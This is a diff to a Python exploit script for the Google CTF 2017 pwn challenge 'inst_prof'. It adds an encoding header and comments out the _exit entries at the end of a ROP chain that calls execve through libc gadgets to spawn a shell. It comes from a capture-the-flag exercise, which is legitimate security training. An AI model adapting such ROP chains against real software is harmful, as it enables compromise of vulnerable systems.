@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 #
 # Google CTF 2017 pwn inst_prof
 #
@@ -199,9 +200,9 @@ if __name__ == "__main__":
     ROP += p64(LIBC_BASE + libc.search(asm('pop rdx; ret')).next())
     ROP += p64(0)
     ROP += p64(LIBC_BASE + libc.symbols['execve'])
-    ROP += p64(CODE_BASE + pop_rdi)
-    ROP += p64(0)
-    ROP += p64(LIBC_BASE + libc.symbols['_exit'])
+    #ROP += p64(CODE_BASE + pop_rdi)
+    #ROP += p64(0)
+    #ROP += p64(LIBC_BASE + libc.symbols['_exit'])
 
     print "length of ROP: %d" % len(ROP)
     for x in ROP:
